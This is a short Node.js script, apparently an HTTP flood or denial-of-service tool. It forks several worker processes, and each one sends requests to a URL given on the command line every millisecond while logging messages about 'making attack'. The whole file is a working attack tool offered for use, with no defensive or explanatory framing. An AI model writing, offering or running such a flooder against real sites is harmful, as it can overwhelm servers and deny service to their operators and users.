const cluster = require("cluster")
const request = require("request")

const URL = process.argv[2]
const threads = process.argv[3] || 5


if(cluster.isMaster) {
	console.log("[ MAIN ] - starting threads to attack.")
	if(!URL) return console.log("[ ERROR ] - please put a URL")
	for(let thread = 0; thread < threads; thread++) {
		console.log(`[ THREAD ] - thread ${thread} started and ready to work!`)
		cluster.fork()
	}
} else {
	console.log("[ THREAD ] - thread pid:", process.pid)
	console.log("[ THREAD ] - making attack to", URL)
	setInterval(async () => {
		request(URL, function(error, response, body) {
		console.log(`[ THREAD ] - response status code from ${URL}:`, response.statusCode)
	})
	}, 1)
}
